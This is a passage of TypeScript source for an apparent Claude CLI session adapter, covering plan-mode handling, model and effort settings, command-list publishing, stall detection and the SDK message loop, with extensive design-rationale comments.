    this.approvals.request(mode)
    return Promise.resolve()
  }

  /**
   * Always `false`, and that is a statement about where the exit LIVES rather than a missing
   * feature (060) — the same shape as `CodexSessionHandle.blanketGrants` returning `[]`.
   *
   * Claude's plan mode already ends with a user gesture: the model calls `ExitPlanMode` carrying
   * the plan, this adapter raises it as a `user_input_request`, and answering it approves — after
   * which the same session does the work (030, and the `USER_INPUT_TOOLS` branch above). So there
   * is nothing here for a second, client-side "go ahead" to do, and offering one would be a rival
   * way out of the same state that the model's own card knows nothing about.
   *
   * ⛔ **This docstring used to end by recording an asymmetry, and 150 is the bill for it.** It said
   * a Claude session whose plan was approved *"still resumes with `permissionMode: 'plan'`, because
   * the launch flag is all the resume has and the approval happened inside the SDK where we cannot
   * see it"*. The second half was never true of the APPROVAL: it arrives here as an answer to a card
   * this adapter raised itself, and {@link respondUserInput} is holding it. What we could not see
   * was the SDK's own mode — a different fact, and not the one anything needed.
   *
   * It was harmless while the provider owned the only floor. 140 added a second floor above it that
   * reads {@link planning}, and the recorded asymmetry became a session that could read and nothing
   * else for life. An approved `ExitPlanMode` now settles plan mode where the approval lands, and
   * {@link RuntimeHost.respondUserInput} writes the durable half through the same
   * `plan_mode`/`plan_ended_at` pair 060 built for Codex — so a resume after approval comes back
   * NOT planning, and this provider no longer has the asymmetry to name.
   *
   * ⚠️ **What stays true is the sentence above it**: there is nothing here for a client-side
   * go-ahead to do, because the way out is the model's own card. This still returns `false`.
   */
  get planNeedsGoAhead(): boolean {
    return false
  }

  get settings(): SessionSettingsState {
    return {
      model: { effective: this.models.effective, requested: this.models.requested },
      reasoningEffort: { effective: this.efforts.effective, requested: this.efforts.requested },
      planMode: { effective: this.plan.effective, requested: this.plan.requested },
    }
  }

  /** Record a model change for the NEXT turn (076); the SDK call is made in {@link send}. */
  setModel(model: string | undefined): Promise<void> {
    if (this.isShuttingDown) {
      return Promise.reject(new Error('cannot change the model: this session is no longer active'))
    }
    if (!this.query?.setModel) {
      return Promise.reject(
        new Error('cannot change the model: the pinned SDK query exposes no setModel()'),
      )
    }
    this.models.request(model)
    return Promise.resolve()
  }

  /**
   * Record an effort change for the NEXT turn (076).
   *
   * ⚠️ **A level Claude does not have is REFUSED BY NAME, never rounded** (076 §2). The pinned SDK's
   * `EffortLevel` is a closed five-member union and `ReasoningEffort` is now an open string, so a
   * value from the other provider's vocabulary — `ultra` — can genuinely arrive here, from a
   * persisted row or a hand-edited setting. Passing it would be a type error; dropping it would be
   * the toggle that silently does nothing; coercing it to `high` would be this app inventing an
   * answer on the user's behalf. Refusing is the only one of the four that leaves the user knowing
   * what happened, and nothing has moved when it does.
   */
  setReasoningEffort(effort: ReasoningEffort | undefined): Promise<void> {
    if (this.isShuttingDown) {
      return Promise.reject(new Error('cannot change the effort: this session is no longer active'))
    }
    if (effort !== undefined && claudeEffort(effort) === null) {
      return Promise.reject(
        new Error(
          `this provider does not offer the reasoning effort "${effort}" — it takes ` +
            `${CLAUDE_EFFORTS.join(', ')}`,
        ),
      )
    }
    if (!this.query?.applyFlagSettings) {
      return Promise.reject(
        new Error('cannot change the effort: the pinned SDK query exposes no applyFlagSettings()'),
      )
    }
    this.efforts.request(effort)
    return Promise.resolve()
  }

  /**
   * Turning plan mode ON is supported; turning it OFF is refused — see {@link planNeedsGoAhead}.
   *
   * ⚠️ **The asymmetry is the 076 ruling, not an unfinished half.** `setPlanMode(false)` IS the
   * go-ahead, and on this provider the go-ahead already exists somewhere else: the model raises
   * `ExitPlanMode` carrying the plan, this adapter surfaces it as a `user_input_request`, and
   * answering that card is what releases it (030). A client-side switch beside it would be a second
   * way out of one state — exactly the "two buttons doing one thing" 076 forbids.
   *
   * ⛔ **The refusal is load-bearing and the release is now real, which are different statements**
   * (150). This still rejects, and {@link RuntimeHost.endPlanMode} — whose second line calls it — is
   * therefore a Codex-only path, as it has been since 076. That is not a hole: the renderer draws
   * that button from {@link planNeedsGoAhead}, which is `false` here, so the gesture is never
   * offered for a Claude session and the throw is the belt behind a button that does not exist.
   * ⚠️ **It does mean 148 H2 — the go-ahead that skipped the sign-in gate, fixed in 149 — was only
   * ever reachable on Codex.** The gate above the release is right for the provider that has one.
   *
   * Turning it ON has no such rival and is genuinely new: `Query.setPermissionMode('plan')` is a
   * real control request at our pin, so a conversation can start planning halfway through, which
   * before 076 meant starting a new one.
   */
  setPlanMode(on: boolean): Promise<void> {
    if (this.isShuttingDown) {
      return Promise.reject(new Error('cannot change plan mode: this session is no longer active'))
    }
    if (!on) {
      return Promise.reject(
        new Error(
          "cannot stop planning from here: this provider's plan mode ends when you answer its own " +
            'plan-approval request, not by a client-side switch',
        ),
      )
    }
    if (this.plan.requested) {
      return Promise.reject(new Error('cannot start plan mode: this session is already planning'))
    }
    if (!this.query?.setPermissionMode) {
      return Promise.reject(
        new Error('cannot start plan mode: the pinned SDK query exposes no setPermissionMode()'),
      )
    }
    this.plan.request(true)
    return Promise.resolve()
  }

  get workFolders(): {
    readonly effective: readonly string[]
    readonly requested: readonly string[]
  } {
    return { effective: this.folders.effective, requested: this.folders.requested }
  }

  /** The folders this conversation already works in: its own, and the ones it was given. */
  private worksIn(): readonly string[] {
    return [this.cwd, ...this.folders.effective]
  }

  /**
   * 🔴 **W4.189 · the whole list, for the NEXT turn**; the SDK call is made in
   * {@link applyPendingSettings}. ⚑ Nothing is refused here — the contract returns nothing — so a
   * query that cannot take it fails that turn's send instead, by name. A copy, so a caller that
   * later changes its array changes nothing here.
   */
  setWorkFolders(folders: readonly string[]): void {
    this.folders.request([...folders])
  }

  /** What Claude reports it is running; undefined until `system:init` arrives (081). */
  private _agentInfo: AgentInfo | undefined

  /**
   * ⚑ **F099 · the effort Claude last said a turn ran at** ({@link noteReportedEffort}), with the
   * model and the asked-for effort of that turn — kept so the next turn's `system/init`, which names
   * no effort, does not take it back while neither has moved.
   */
  private effortReported: { level: string; model: string; asked: string | undefined } | undefined

  get agentInfo(): AgentInfo | undefined {
    return this._agentInfo
  }

  /** The settings this launch gave the provider ({@link SessionHandle.launchSettings}). */
  launchSettings: readonly LaunchSetting[] | undefined

  /**
   * The validated provider ref, or `null` until `system/init` establishes it (011) — ⚑ **or, after a
   * close before init, the id this launch asked for, when the CLI's transcript under it names a
   * working folder — carrying that recorded folder** (722, R79; see {@link launch} and
   * {@link launchTranscriptCwd}). `RuntimeHost` archives from this on close.
   */
  get ref(): SessionRef | null {
    return this._ref
  }

  /**
   * ⚑ **722 · R79 — take the id this launch asked the provider to use** (see {@link launch}).
   *
   * ⚠️ Public for the reason {@link noteSessionCrons} is: its caller is {@link ClaudeRuntime.start},
   * outside this class. It is not part of `SessionHandle`, and nothing but `start` may call it — a
   * resume names its conversation with `resume`, and the CLI refuses a second id beside it.
   */
  holdLaunchRef(sessionId: string, recorded: () => Promise<string | null>): void {
    this.launch = { sessionId, recorded }
  }

  /**
   * ⚑ **This launch asked for ultracode** ({@link StartOptions.ultracode}), so an effort change
   * keeps asking for it. 0.3.287's `applyFlagSettings`: *"An `effortLevel` that moves the session
   * to a different level, sent without an `ultracode` key, also turns ultracode off; send both keys
   * to change the level and keep it on."* The person asked for it for the run, and moving the effort
   * is not taking that back. Still a request, never a state: nothing reads it back.
   */
  private ultracodeAsked = false

  askedForUltracode(): void {
    this.ultracodeAsked = true
  }

  /**
   * ⚑ **722 · R79 — the id this launch asked for, before any init names it** (see {@link launch});
   * `null` on a resume. Read by the host's adoption scan, which lists a transcript under it as this
   * launch's own even while the ref is still `null` (the `722` review).
   */
  get launchedAs(): string | null {
    return this.launch?.sessionId ?? null
  }

  /**
   * ⚑ **722 · R79 — the launch's ref if the CLI recorded a folder under its id, else `null`.**
   * The ref's cwd is the one RECORDED ({@link launchTranscriptCwd}), never the launch's spelling.
   *
   * ⚠️ **A doubt is `null`**: the reader throws for a folder it could not read, this is a close,
   * which must not throw. Asked after the child's exit receipt, when the file is final.
   */
  private async launchRefIfRecorded(): Promise<SessionRef | null> {
    if (this.launch === null) return null
    try {
      const cwd = await this.launch.recorded()
      if (cwd === null) return null
      return { provider: 'claude', sessionId: this.launch.sessionId, cwd, rotation: 0 }
    } catch {
      return null
    }
  }

  private get isShuttingDown(): boolean {
    return this.machine.isTerminal || this.machine.state === 'closing'
  }

  /**
   * ⚠️ **The witness is not optional** — see {@link ClaudeSessionHandle.child}. It is taken here
   * rather than in the constructor because the child does not exist until the query does: the SDK
   * spawns it inside `query()`, from the very Options the witness was written into.
   */
  attachQuery(query: ClaudeQuery, child: ClaudeChildWitness): void {
    this.query = query
    this.child = child
    // ⛔ **Fire-and-forget, and it must stay that way** (279). The handshake this awaits is the one
    // `start()` is already waiting on elsewhere, but awaiting it HERE would put a control request
    // between the caller and its handle — so a CLI slow to initialize would delay the first paint of
    // a conversation for a fact the palette needs and the composer does not.
    void this.publishCommands(query)
    void this.learnTheAccount(query)
  }

  /**
   * Ask the CLI who this session is signed in as, once, through {@link ClaudeQuery.accountInfo}. An
   * answer that names no email, a query that cannot say, a call that fails and one that never
   * answers all leave the account not known.
   * ⛔ The answer is held here and read through {@link account} only: no event carries it, and
   * nothing logs it.
   */
  private async learnTheAccount(query: ClaudeQuery): Promise<void> {
    this.accountSaid = undefined
    if (!query.accountInfo) {
      this.accountSaid = null
      return
    }
    let said: SessionAccount | null = null
    try {
      const info = await withDeadline(
        query.accountInfo(),
        COMMAND_READ_TIMEOUT_MS,
        'claude account',
      )
      said = sessionAccountFrom({ email: info.email, organization: info.organization })
    } catch {
      // Not known, and nothing to say about why: the reason could name the account.
    }
    if (this.query === query) this.accountSaid = said
  }

  account(): SessionAccount | null | undefined {
    return this.accountSaid
  }

  /**
   * ⛔ **What this agent will answer to, published once at start** (279) — see
   * {@link ClaudeQuery.initializationResult} for why the list is taken from the handshake.
   *
   * ⚠️ **Silence is the failure mode, and it is the honest one.** A query that cannot say, a
   * handshake that never answers, and a rejected call all publish nothing — so the registry
   * downstream stays `null`, which the palette renders as *"BroBot has not been told what this agent
   * can do"* rather than as an agent with no commands. ⛔ **Emitting `commands: []` here would be
   * the lie `279` §2 names by name**, and it is the one failure this path must not have.
   *
   * ⚑ `emit` already drops after terminalization (007 P1-1), so a handshake that answers after the
   * session has closed needs no second guard.
   *
   * ## ⚠️ It may land BEFORE the `session` event, and that is stated rather than prevented
   *
   * Codex's sibling read (`readRateLimitBaseline`) is placed *"after the `session` event exists so
   * nothing can precede it in the stream"* — and that ordering is available there because Codex's
   * handshake is a REQUEST whose response carries the ref. ⛔ **Claude's ref only arrives on the
   * message stream** (`system/init`), so there is no point in this class at which the adapter can
   * guarantee the session event has been emitted before this one; both come out of the same CLI
   * handshake and the SDK does not order the control response against the message.
   *
   * ⚑ **Nothing orders on it**, which is why this is a note and not a defect. `provider_commands` is
   * not lifecycle: `isProviderWork` excludes it deliberately, the machine never reads it, and the
   * host's `deliver` gives it an ordinal and records it like any other frame. What a person could
   * see, in the worst case, is the command list landing one ordinal before the conversation it
   * belongs to — which is true, and is the honest order for two facts that arrived together.
   */
  private async publishCommands(query: ClaudeQuery): Promise<void> {
    if (!query.initializationResult) return
    try {
      const result = await withDeadline(
        query.initializationResult(),
        COMMAND_READ_TIMEOUT_MS,
        'claude command list',
      )
      const { commands, dropped } = boundCommands(result.commands.map(readCommand))
      this.emit({
        type: 'provider_commands',
        commands,
        prefix: CLAUDE_COMMAND_PREFIX,
        ...(dropped > 0 ? { dropped } : {}),
        source: 'initializationResult',
      })
    } catch {
      // See the docblock: nothing published is *"we were not told"*, which is a state the palette
      // has a sentence for. There is no surface for *"we asked and the provider would not say"*, and
      // inventing one is a dispatch of its own rather than a line here.
    }
  }

  /**
   * 🔴 **708 · the list asked for NOW** — see {@link SessionHandle.providerCommands}.
   *
   * ⚑ **Published as well as returned**, as {@link publishCommands} publishes the handshake's: the
   * host asks only when this life has published no list, so the palette is told the answer the host
   * decides on. ⛔ **A rejection publishes nothing**, for that method's reason — silence is *"we were
   * not told"*, and an invented `[]` would say this agent has no commands.
   *
   * ⚠️ **Bounded twice**: by {@link COMMAND_READ_TIMEOUT_MS} here, and — since the host waits on this
   * one, where nothing waits on the handshake's — by the host's shorter
   * `DEFAULT_COMMAND_LIST_WAIT_MS`.
   */
  async providerCommands(): Promise<ProviderCommandAnswer> {
    const query = this.query
    if (query?.supportedCommands === undefined) {
      throw new Error('this Claude query cannot say which commands it answers to')
    }
    const rows = await withDeadline(
      query.supportedCommands(),
      COMMAND_READ_TIMEOUT_MS,
      'claude command list',
    )
    const { commands, dropped } = boundCommands(rows.map(readCommand))
    this.emit({
      type: 'provider_commands',
      commands,
      prefix: CLAUDE_COMMAND_PREFIX,
      ...(dropped > 0 ? { dropped } : {}),
      source: 'supportedCommands',
    })
    return { commands, prefix: CLAUDE_COMMAND_PREFIX, ...(dropped > 0 ? { dropped } : {}) }
  }

  /**
   * The CLI child's pid (233) — real for the first time, because this app now spawns it.
   *
   * See {@link ClaudeChildWitness} for how, and {@link SessionHandle.providerPid} for what 076
   * could honestly say before it. `undefined` until the SDK actually spawns, and for a fake query
   * that never does.
   */
  get providerPid(): number | undefined {
    return this.child.pid
  }

  /**
   * ⛔ **The termination fact** (233) — see {@link SessionHandle.awaitProcessExit}.
   *
   * ⚑ Idempotent by construction: {@link ClaudeChildWitness.exited} is a getter over one pre-built
   * promise, so every call after the spawn returns the same object.
   */
  awaitProcessExit(): Promise<void> {
    return this.child.exited
  }

  /** Start consuming the SDK stream in the background. */
  begin(opening: 'started' | 'resumed'): void {
    this.opening = opening
    this.machine.markStarting()
    void this.runLoop()
  }

  /**
   * 🔴 **736 · a grant that switches the CLI's mode ends its plan mode, and this handle says so.**
   * While planning, the CLI's own suggestion for an edit is `setMode acceptEdits` — its *"Yes, and
   * switch to accept edits"* (measured, the interactive CLI in plan mode) — and installing it takes
   * the CLI out of plan mode. ⛔ Without this the handle went on saying *planning* over a CLI that
   * was not (`736`'s review). ⚑ `740` · the host writes the release down from the answer's door
   * (`RuntimeHost.recordPlanPhase`), so a reopen does not bring the plan back.
   */
  private leavePlanIfTheModeDoes(updates: readonly PermissionUpdate[]): void {
    const leaves = updates.some((update) => update.type === 'setMode' && update.mode !== 'plan')
    if (leaves && this.plan.effective) this.plan.settle(false)
  }

  /** ⚑ **F084** — {@link commandsWaitedOn}, kept from the events this handle emits. */
  private noteTheCommandsWaitedOn(event: RuntimeEvent): void {
    if (
      event.type === 'tool_call' &&
      event.name === 'Bash' &&
      event.parentToolCallId === undefined
    ) {
      this.commandsWaitedOn.add(event.id)
    }
    if (event.type === 'tool_result') this.commandsWaitedOn.delete(event.id)
    // ⚑ A turn's ending ends its waits: a call it never answered is not the next turn's.
    if (event.type === 'turn') this.commandsWaitedOn.clear()
  }

  private emit(event: RuntimeEvent): void {
    // After terminalization, drop everything: no late provider event may mutate
    // cached status or reach a consumer that has already seen `ended` (007 P1-1).
    if (this.terminated) return
    this.noteTheCommandsWaitedOn(event)
    // Deltas are coalesced; the coalescer flushes them before any non-delta event
    // (message/terminal), preserving ordering (019). It calls `deliver` for real output.
    this.coalescer.feed(event)
  }

  /**
   * ⛔ **One `session_crons` payload, and the `Stop` hook is its ONLY caller** (253).
   *
   * ⚠️ **Total and non-throwing on purpose.** Its caller is a provider callback, so a throw here
   * would surface inside the CLI's hook machinery at the moment a turn is trying to end — the worst
   * place in the session to be raising an exception about a display fact. Everything it can refuse, it refuses by publishing nothing — see
   * {@link SessionCrons.observe}, where a payload that is not an array is *"this frame did not say"*
   * and never an empty set.
   *
   * ⚑ `emit` already drops after terminalization (007 P1-1), so a hook that fires while the session
   * is closing needs no second guard here.
   *
   * ⚠️ Public for the reason {@link sessionGrants} is: the hook that calls it is built outside this
   * class, when the session starts. It is not part of `SessionHandle` and no consumer may call it —
   * see `scheduled-work.ts` for why this fact deliberately has no contract member.
   */
  noteSessionCrons(raw: unknown, source: string): void {
    const event = this.sessionCrons.observe(raw, source)
    if (event) this.emit(event)
  }

  /**
   * A `PreToolUse` hook's input, for a scheduling call's start ({@link SchedulingCalls.called}).
   * Total, for `noteSessionCrons`' reason, and public for the same one.
   */
  noteSchedulingCall(input: unknown): void {
    try {
      this.schedulingCalls.called(input)
    } catch {
      /* a call we could not note keeps no bracket, never a broken tool call */
    }
  }

  /**
   * A `PostToolUse` hook's input: a scheduling call's receipt, published as it happens
   * ({@link SchedulingCalls.answered}). Total, and public, as {@link noteSchedulingCall}.
   */
  noteSchedulingAnswer(input: unknown): void {
    try {
      const event = this.schedulingCalls.answered(input)
      if (event !== undefined) this.emit(event)
    } catch {
      /* a receipt we could not read is one we do not publish, never a broken tool call */
    }
  }

  /**
   * ⚑ **F099 · the effort a turn ran at, as the CLI stated it on its `Stop`** — a provider's report,
   * so it replaces the asked-for value and is marked reported. ⚠️ Read with the newest `init` model
   * this adapter has read: one arriving before any `init` has nothing to belong to, and a hook that
   * outruns a turn's own `init` (hooks are answered as they arrive, messages in order) pairs the
   * level with the model before — the next `init` puts it right. ⚠️ A one-turn effort (a skill's
   * own `effort:`) is reported as it ran, and stands until the next turn ends. Total, for
   * `noteSessionCrons`' reason. ⚠️ Public for the same reason too: the hook that calls it is built
   * outside this class.
   */
  noteReportedEffort(level: string): void {
    const model = this._agentInfo?.model
    if (model === undefined) return
    this.effortReported = { level, model, asked: this.efforts.effective }
    this._agentInfo = { model, reasoningEffort: level, reasoningEffortReported: true }
  }

  /**
   * Makes a silent stall visible (074). Armed while the turn is `working`, reset by every event, and
   * stopped the moment the turn terminalizes or the session ends. `waiting_permission` is
   * deliberately NOT watched — a card waiting on the user is not a stall.
   */
  private readonly stallWatchdog = new StallWatchdog((idleMs, afterReasoning) =>
    this.reportStall(idleMs, afterReasoning),
  )

  /**
   * The running todo list this session's `plan_update`s are built from (028). It is per-SESSION
   * state, not per-turn: Claude's task list outlives a turn, and a `TaskUpdate` in turn 2 addresses
   * a task created in turn 1. It lives here rather than in `normalizeMessage` because that function
   * is pure and must stay so — see `todo-plan.ts` for why the Claude half needs state at all.
   */
  private readonly todoPlan = new TodoPlan()
  /** ⚑ **F080** — the uuid the open turn's message was sent with ({@link send}). */
  private sentForTheTurn: { readonly turnId: number; readonly uuid: string } | null = null
  private readonly limits = new ClaudeLimitWatch()
  /** Whether the open turn was refused because its account can't pay. */
  private readonly billing = new ClaudeBillingWatch()

  /**
   * Which of this session's tracked tasks are actually sub-agents (035). Session-scoped for the same
   * reason {@link todoPlan} is: `normalizeMessage` decides one message at a time, and the fact that
   * distinguishes a sub-agent from a Bash call arrives on the FIRST of a task's four messages and
   * never again. See `sub-agent-tasks.ts`.
   */
  private readonly subAgentTasks = new SubAgentTasks()
  /**
   * Which file edits are in flight (096). Session-scoped for the same reason {@link subAgentTasks}
   * is: a `tool_use` and its `tool_result` are two different SDK messages, so the path has to
   * outlive the call that named it.
   */
  private readonly fileEdits = new FileEdits()
  /**
   * Which of this session's tracked tasks are dynamic workflows, and where each one hangs (108).
   * Session-scoped for a sharper version of {@link subAgentTasks}'s reason: `task_updated` carries
   * neither the `task_type` that admits a run nor the `tool_use_id` that places it, and it is one of
   * the two endings. See `workflow-tasks.ts`.
   */
  private readonly workflowTasks = new WorkflowTasks()
  /**
   * Which of this session's tracked tasks are running in the BACKGROUND right now (247).
   *
   * ⛔ **Session-scoped for the opposite reason to its three neighbours.** They remember because a
   * discriminator arrives once and never again; this one remembers so that it can FORGET on the
   * provider's word — the level payload replaces the set wholesale, and a per-message registry would
   * be empty every time the question was asked. It is also why the `tool_result` ~8 ms after
   * `task_started` can be marked as a detachment at all. See `background-tasks.ts`.
   */
  private readonly backgroundTasks = new BackgroundTasks()
  /**
   * 🔴 **Where THIS session's memory store is, as the provider named it** (330).
   *
   * ⚑ **Session-scoped for the first of its neighbours' reasons**: `system/init.memory_paths.auto`
   * arrives once per turn and the calls that land in that directory arrive many frames later, so a
   * per-message registry would be empty every time the question was asked. ⚠️ It re-reads on every
   * `init` rather than latching, so a store that stops being attested stops labelling rows at the
   * next turn. See `memory-store.ts`.
   */
  private readonly memoryStore = new ClaudeMemoryStore()

  /**
   * 🔴 **What each tool ANSWERED, whole** (462) — the bytes `TOOL_SUMMARY_MAX` cuts off the row.
   *
   * ⚠️ **Session-scoped like its neighbours, and handed to {@link normalizeMessage} like them**, so
   * the one place that reads a receipt's id and its content together is the one place that keeps
   * them. ⛔ **Never cleared on close**: an answer is a record of what a tool said rather than a
   * claim about now, and emptying it as a conversation ends would take the panel away at exactly
   * the moment the last thing that happened is worth reading. `tool-answer.ts` holds the ceilings.
   */
  private readonly toolAnswers = new ToolAnswers()
  private messageReceipts: ClaudeMessageReceipts | undefined

  /**
   * ⚑ **What the CLI announced about itself in each turn's `system/init`** (680) — the version this
   * app spawned and the model the turn asked for, which a refusal is said against (R28c). Session-
   * scoped and re-read on every `init`, like {@link memoryStore}: the init arrives frames before the
   * refusal that needs it, and a model changed mid-conversation is named by the next turn's init.
   */
  private readonly announced = new AnnouncedCli()

  /**
   * ⛔ **What this session has promised to do LATER** (253) — see `session-crons.ts`.
   *
   * Session-scoped like the registries above it, and for a reason none of them share: the fact
   * this one holds **never touches the message stream**. It arrives on the `Stop` hook, so this is
   * the only registry here that {@link normalizeMessage} is not handed — {@link noteSessionCrons} is
   * its whole input, and `250`'s positive control is why nobody should go looking for a normalizer
   * arm that could feed it.
   */
  private readonly sessionCrons = new SessionCrons()
  /** The scheduling calls this session's provider ran, read at its tool hooks. */
  private readonly schedulingCalls = new SchedulingCalls()

  /**
   * The cards this session has opened and not closed, so a turn cannot end leaving one recorded as
   * running (075). Session-scoped, like {@link subAgentTasks} — see `open-sub-agents.ts` for what
   * `smoke:claude` §3.1d actually catches and what it does not.
   */
  private readonly openSubAgents = new OpenSubAgents()

  /**
   * Tools approved for THIS session (031) — written by `canUseTool`'s grants and read for the
   * header's disclosure ({@link blanketGrants}). ⚑ Since `728` the `PreToolUse` guard no longer reads
   * it (see {@link SessionGrants}).
   */
  readonly sessionGrants = new SessionGrants()

  /**
   * What each open card actually OFFERED (031), mirroring Codex's own validation.
   *
   * The offered set is now per-tool — an opaque tool is not offered a session grant at all — so a
   * blanket check against the adapter's full vocabulary would let `allow_for_session` through for a
   * card that never showed the button. Validating against THIS card's set is what makes the
   * disclosure binding rather than decorative.
   */
  private readonly offeredDecisions = new Map<string, ReadonlySet<PermissionOutcome>>()

  /**
   * What each open question card actually ASKED (142) — the sibling of {@link offeredDecisions}, and
   * it exists for the same reason: an answer can only be judged against the request it answers.
   *
   * ⚠️ **This is the whole structural fix to 141's HIGH 1.** The questions used to live only in the
   * `canUseTool` continuation's closure, which resumes *after* {@link respondUserInput} has taken
   * the broker slot and returned — so the adapter could not decide whether an answer was usable
   * until it had already accepted it, and `RuntimeHost` recorded `answered` for answers the adapter
   * went on to deny. Holding them here is what lets the refusal happen at the gesture instead.
   *
   * ⚑ **Bounded by the continuation, not by the answer.** The entry is deleted the moment the await
   * returns — on every settlement path there is, including abort, `settleAll` and close — so a
   * refused answer leaves it in place (the card is still live and still answerable) and a settled
   * request can never leave one behind. Codex reaches the same place from the other direction: its
   * `RequestState.claimed` has carried the request's own payload builder since 067.
   */
  private readonly askedQuestions = new Map<string, readonly UserInputQuestion[]>()

  /**
   * 🔴 **728 · the open cards that are an MCP server's FORM**, so {@link respondUserInput} can refuse
   * an answer the server's own types would reject BEFORE the slot is filled — `142` §1's rule, for
   * the one conversion {@link answerToForward} does not make ({@link elicitationContent}). Keyed and
   * bounded as {@link askedQuestions} is.
   */
  private readonly elicitationForms = new Map<string, CodexElicitation>()

  /**
   * ⚑ **728 · the server-form cards a PERSON answered** — set by {@link respondPermission} and
   * {@link respondUserInput} before the slot is filled, read and cleared by {@link handleElicitation}.
   * ⛔ A Stop, a close and an SDK abort settle the same slot with the same safe refusal a person's
   * Deny sends, so without this the server would be told `decline` — *the user declined* in MCP's
   * words — for a form nobody answered (`728`'s review). Those go back as `cancel`.
   */
  private readonly answeredByAPerson = new Set<string>()

  /**
   * The open cards that are plan-mode gestures, and what approving one settles plan mode TO (150).
   *
   * Keyed and bounded exactly like {@link askedQuestions}, in the same two places and for the same
   * reason — set once the reservation is won and before the card goes out, deleted the moment the
   * continuation returns on every settlement path there is. See {@link PLAN_GESTURES} for what this
   * is repairing.
   */
  private readonly planGestures = new Map<string, boolean>()

  /** Emit the stall notice as a NON-FATAL error: visible, but it never ends the turn or session. */
  private reportStall(idleMs: number, afterReasoning = false): void {
    // ⚠️ **`hasProviderWork`, not `hasActiveTurn` (123).** The watchdog is armed off the `working`
    // status, which now covers a burst with no turn behind it — so gating the notice on a turn would
    // arm a timer whose only outcome is silence. Worse, the notice ends *"you can interrupt"*, and
    // that sentence is only worth printing where {@link SessionMachine.forceEnd} can act on it,
    // which is precisely this predicate.
    if (this.terminated || this.machine.isTerminal || !this.machine.hasProviderWork) return
    // Waiting on the USER is not provider silence (076). The watchdog is already disarmed for this
    // state, but the guard lives here too: a stall notice fired at a question the agent itself
    // asked is wrong however it was reached, and this is the one place that decides to emit.
    if (this.currentStatus === 'waiting_permission') return
    this.emit({
      type: 'error',
      fatal: false,
      message: stallNotice(idleMs, afterReasoning),
      stall: true,
      ...(afterReasoning ? { thinking: true as const } : {}),
    })
  }

  /** Keep the watchdog in step with the turn: any event is progress; a terminal ends the watch. */
  private trackProgress(event: RuntimeEvent): void {
    if (event.type === 'turn' || (event.type === 'session' && event.state === 'ended')) {
      this.stallWatchdog.stop()
      return
    }
    if (event.type === 'status') {
      if (event.state === 'working') this.stallWatchdog.notice()
      else this.stallWatchdog.stop()
      return
    }
    // The stall notice itself is not provider progress: counting it would re-arm the watchdog and
    // forget that the silence followed reasoning.
    if (event.type === 'error' && event.stall) return
    // ⚠️ **`hasProviderWork`, and without it 123 would ship a false stall notice** (found while
    // wiring it). The watchdog is armed off `status: working`, which now covers a burst with no turn
    // behind it — but progress was still counted only for a turn, so a burst that worked steadily
    // for two minutes would have gone quiet-by-definition and raised *"no activity for 120s"* over
    // an agent that had not stopped for a moment. The watchdog measures silence, and this is the
    // line that decides what counts as not-silence.
    if (this.machine.hasProviderWork) this.stallWatchdog.notice(isReasoning(event))
  }

  private deliver(event: RuntimeEvent): void {
    this.trackProgress(event)
    // ⚑ **Where the app learns the provider is working with no turn open** (123). Here rather than
    // in `runLoop` for the same reason the sub-agent sweep below is: this is the one place output
    // order is final.
    //
    // ⚠️ **It publishes RE-ENTRANTLY, and the resulting order is the intended one.** `sync()` emits
    // through `emit` → `DeltaCoalescer.feed` → back into this function, so the `status: working`
    // reaches `eventQueue` BEFORE the content event that provoked it. That matches every other
    // boundary in this app — `status: working` lands before `user_turn`, measured at every turn
    // boundary in the ledger — and the coalescer is safe under it: `flush()` clears its buffer
    // before calling out, so the nested `feed` finds nothing to flush twice. Moving this below the
    // `push` would put one content event on the wire under a stale `idle`.
    if (isProviderWork(event)) this.machine.noteProviderWork(event.type)
    if (event.type === 'status') this.currentStatus = event.state
    if (event.type === 'session' && event.state !== 'ended') this._ref = event.ref
    // ⛔ **…and a `/clear` moves it too** (199, from 192 H5). This line is the whole of the identity
    // half: `handle.ref` is what `RuntimeHost` archives from, hands over on a resume and writes to
    // the session row, and what `closeSession` announces as ended. Left on the pre-reset id, every
    // one of those would name a conversation the provider is no longer in. ⚑ `721` · R75: the event
    // carries the id of the init AFTER the reset — the reset's own names a conversation with no
    // transcript, and a row left on it was one no Resume could open.
    if (event.type === 'conversation_reset') this._ref = event.ref
    // ⚠️ **A sub-agent card cannot outlive its turn IN THE STREAM** (075). Here rather than in
    // `normalizeMessage` because this is the one place output order is final: the endings have to
    // land BEFORE the boundary that provoked them, or the ledger reads "the turn ended, and then a
    // sub-agent stopped", which is a different sentence. `closeAll` is empty whenever the provider
    // reported its own endings, which is the ordinary case.
    if (endsOpenSubAgents(event)) {
      // ⚑ 695: the boundary is passed so a turn spares an agent still running in the background.
      for (const closing of this.openSubAgents.closeAll(event)) this.eventQueue.push(closing)
    }
    this.openSubAgents.note(event)
    // A terminal `turn` retires the settled tombstones (057, fixing 044 P2 #7). Claude's ids are
    // SDK `toolUseID`s, which are unique per tool call and scoped to the turn that raised them —
    // once the turn is terminal the SDK can no longer re-deliver one, and every `canUseTool`
    // resolver for it is already taken, so a late answer stays a refusal. The duplicate-toolUseID
    // guard (007 P1-2) is unaffected within the turn where duplicates actually occur.
    if (event.type === 'turn') {
      this.permissions.retireSettled()
      this.userInputs.retireSettled()
    }
    this.eventQueue.push(event)
  }

  private async runLoop(): Promise<void> {
    if (!this.query) return
    try {
      for await (const message of this.query) {
        if (this.terminated) break
        let fatalReported = false
        // ⚑ **F076** — the fatal was the provider refusing the login this child was launched with.
        let loginRefused = false
        for (const said of normalizeMessage(
          message,
          this.subAgentTasks,
          this.fileEdits,
          this.workflowTasks,
          this.backgroundTasks,
          this.memoryStore,
          this.toolAnswers,
          this.announced,
          this.messageReceipts,
        )) {
          // ⚑ **A refused credential says WHICH one** — normalizing cannot know what this child was
          // launched on, and the handle does ({@link noteLaunchedOnAKey}).
          // A billing refusal on the saved key says it was the key's account too.
          const event =
            said.type === 'error' &&
            (said.cause === 'auth_stale' || said.billingRefused === true) &&
            this.launchedOnAKey
              ? { ...said, onAKey: true as const }
              : said
          this.emit(event)
          // ⚠️ **`fatal`, not the cause** (110 review). `fatal: true` already means "this session is
          // over" everywhere else it is read — `liveness.ts` terminalizes on it, the transcript fold
          // marks the conversation ended — and this machine was the one place that did not agree.
          // Keying on `cause === 'auth_stale'` instead would have made the general invariant into a
          // special case about one provider's one credential word, so the next fatal a normalizer
          // learns to raise would leave the session running under a screen that says it is over.
          // Today the two are the same event; that is a fact about today, not the rule.
          if (event.type === 'error' && event.fatal) {
            fatalReported = true
